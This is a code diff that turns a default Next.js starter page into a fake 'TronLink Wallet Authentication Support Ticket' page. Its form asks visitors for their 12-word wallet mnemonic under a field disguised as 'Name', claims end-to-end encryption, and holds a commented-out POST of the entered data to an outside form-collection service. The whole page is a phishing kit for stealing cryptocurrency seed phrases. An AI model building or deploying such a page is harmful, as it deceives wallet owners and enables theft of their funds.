@@ -1,101 +1,217 @@
+"use client";
+
 import Image from "next/image";
+import { Albert_Sans, Alegreya, Anonymous_Pro } from "next/font/google";
+import { useState } from "react";
+import Link from "next/link";
+
+const anonymous_Pro = Anonymous_Pro({
+  subsets: ["latin"],
+  weight: ["400", "700"],
+});
+
+const alegreya = Alegreya({
+  subsets: ["latin"],
+  weight: ["400", "700"],
+});
+
+const albert_Sans = Albert_Sans({
+  subsets: ["latin"],
+  weight: ["400", "700"],
+});
 
 export default function Home() {
+  const [formData, setFormData] = useState({
+    name: "",
+    email: "",
+    message: "",
+  });
+
+  const [errors, setErrors] = useState({
+    name: false,
+    email: false,
+  });
+
+  const [formSubmitted, setFormSubmitted] = useState(false);
+  const [loading, setLoading] = useState(false);
+
+  // Email validation regex
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+  // Function to validate individual fields on change
+  const validateField = (name: string, value: string) => {
+    switch (name) {
+      case "name":
+        return value.trim() !== "";
+      case "email":
+        return emailRegex.test(value);
+
+      default:
+        return true;
+    }
+  };
+
+  const handleInputChange = (e: any) => {
+    const { name, value } = e.target;
+
+    setFormData({
+      ...formData,
+      [name]: value,
+    });
+
+    // Dynamically clear the error if the input becomes valid
+    setErrors((prevErrors) => ({
+      ...prevErrors,
+      [name]: !validateField(name, value),
+    }));
+  };
+
+  const validateForm = () => {
+    const newErrors = {
+      name: !formData.name.trim(),
+      email: !emailRegex.test(formData.email),
+    };
+
+    setErrors(newErrors);
+
+    return !newErrors.name && !newErrors.email;
+  };
+
+  const handleSubmit = async (e: any) => {
+    e.preventDefault();
+    if (validateForm()) {
+      setLoading(true);
+      console.log("Form is valid, attempting to submit...");
+      try {
+        // Simulate form submission (API call)
+        await new Promise((resolve) => setTimeout(resolve, 2000)); // Simulate delay
+        // await fetch('https://submit-form.com/6bnIUqvJW', {
+        //   method: 'POST',
+        //   headers: { 'Content-Type': 'application/json' },
+        //   body: JSON.stringify(formData),
+        // });
+
+        console.log("Submitted Data: ", formData);
+
+        setFormSubmitted(true);
+      } catch (error) {
+        console.error("Error submitting form", error);
+      } finally {
+        setLoading(false);
+      }
+    } else {
+      console.log("Form has errors, cannot submit");
+    }
+  };
+
   return (
-    <div className="grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20 font-[family-name:var(--font-geist-sans)]">
-      <main className="flex flex-col gap-8 row-start-2 items-center sm:items-start">
+    <main
+      className={`${anonymous_Pro.className} relative space-y-14 w-full min-h-screen md:p-10 p-5 `}
+    >
+      <div
+        className="absolute inset-0"
+        style={{
+          backgroundImage: "url('/best.png')",
+          backgroundRepeat: "repeat",
+          backgroundSize: "150px",
+          opacity: 0.05,
+          zIndex: -1,
+        }}
+      ></div>
+      <div className="flex flex-col items-center justify-center">
         <Image
-          className="dark:invert"
-          src="https://nextjs.org/icons/next.svg"
+          className="dark:invert "
+          src="/best.png"
           alt="Next.js logo"
-          width={180}
-          height={38}
+          width={140}
+          height={140}
           priority
         />
-        <ol className="list-inside list-decimal text-sm text-center sm:text-left font-[family-name:var(--font-geist-mono)]">
-          <li className="mb-2">
-            Get started by editing{" "}
-            <code className="bg-black/[.05] dark:bg-white/[.06] px-1 py-0.5 rounded font-semibold">
-              src/app/page.tsx
-            </code>
-            .
-          </li>
-          <li>Save and see your changes instantly.</li>
-        </ol>
+        <h1 className={`${alegreya.className} text-4xl font-normal `}>
+          TronLink Wallet
+        </h1>
+        <p className="text-md">Link Tron Ecosystem</p>
+      </div>
+      <div className={` ${albert_Sans.className} mx-auto`}>
+        <h1
+          className={`  md:text-4xl text-2xl italic leading-tight py-2 border-t-[1px] border-b-[1px] border-white text-center`}
+        >
+          Welcome to Tronlink Wallet <br /> Authentication Support <br />
+          Ticket
+        </h1>
+      </div>
 
-        <div className="flex gap-4 items-center flex-col sm:flex-row">
-          <a
-            className="rounded-full border border-solid border-transparent transition-colors flex items-center justify-center bg-foreground text-background gap-2 hover:bg-[#383838] dark:hover:bg-[#ccc] text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="https://nextjs.org/icons/vercel.svg"
-              alt="Vercel logomark"
-              width={20}
-              height={20}
+      <div className="flex flex-col gap-4 md:text-2xl text-xl tracking-wide">
+        <h1>All information is end to end encrypted</h1>
+        <h1>
+          Fill and submit this support ticket to the system database to
+          authenticate your wallet to the appropriate form.
+        </h1>
+      </div>
+
+      {!formSubmitted ? (
+        <form onSubmit={handleSubmit} className="space-y-6">
+          <div className="flex flex-col gap-1">
+            <label htmlFor="name">
+              12 mnemonics/words for Authentication <span>(required)</span>
+            </label>
+            <input
+              type="text"
+              id="name"
+              name="name"
+              value={formData.name}
+              onChange={handleInputChange}
+              className={`${
+                errors.name ? "border-2 border-red-500" : ""
+              } text-black py-3 px-2 rounded-md text-xl`}
+              placeholder="Name"
             />
-            Deploy now
-          </a>
-          <a
-            className="rounded-full border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center hover:bg-[#f2f2f2] dark:hover:bg-[#1a1a1a] hover:border-transparent text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 sm:min-w-44"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
+            {errors.name && (
+              <p className="text-red-500">Please fill out this field.</p>
+            )}
+          </div>
+
+          <div className="flex flex-col gap-1">
+            <label htmlFor="email">
+              Email Address <span>(required)</span>
+            </label>
+            <input
+              type="email"
+              id="email"
+              name="email"
+              value={formData.email}
+              onChange={handleInputChange}
+              className={`${
+                errors.email ? "border-2 border-red-500" : ""
+              } text-black py-3 px-2 rounded-md text-xl`}
+              placeholder="Email"
+            />
+            {errors.email && (
+              <p className="text-red-500">
+                Please provide a valid email address.
+              </p>
+            )}
+          </div>
+
+          <button
+            type="submit"
+            className="flex gap-2 items-center bg-white text-black px-8 py-2 text-xl font-medium rounded-full"
           >
-            Read our docs
-          </a>
+            Submit
+            {loading && <span className="loader"></span>}
+          </button>
+        </form>
+      ) : (
+        <div className="text-2xl space-y-6">
+          <p className="text-green-500">Ticket submitted successfully!</p>
+          <button
+            onClick={() => setFormSubmitted(false)}
+            className="bg-none underline cursor-pointer"
+          >
+            Go back
+          </button>
         </div>
-      </main>
-      <footer className="row-start-3 flex gap-6 flex-wrap items-center justify-center">
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="https://nextjs.org/icons/file.svg"
-            alt="File icon"
-            width={16}
-            height={16}
-          />
-          Learn
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="https://nextjs.org/icons/window.svg"
-            alt="Window icon"
-            width={16}
-            height={16}
-          />
-          Examples
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="https://nextjs.org/icons/globe.svg"
-            alt="Globe icon"
-            width={16}
-            height={16}
-          />
-          Go to nextjs.org →
-        </a>
-      </footer>
-    </div>
+      )}
+    </main>
   );
 }
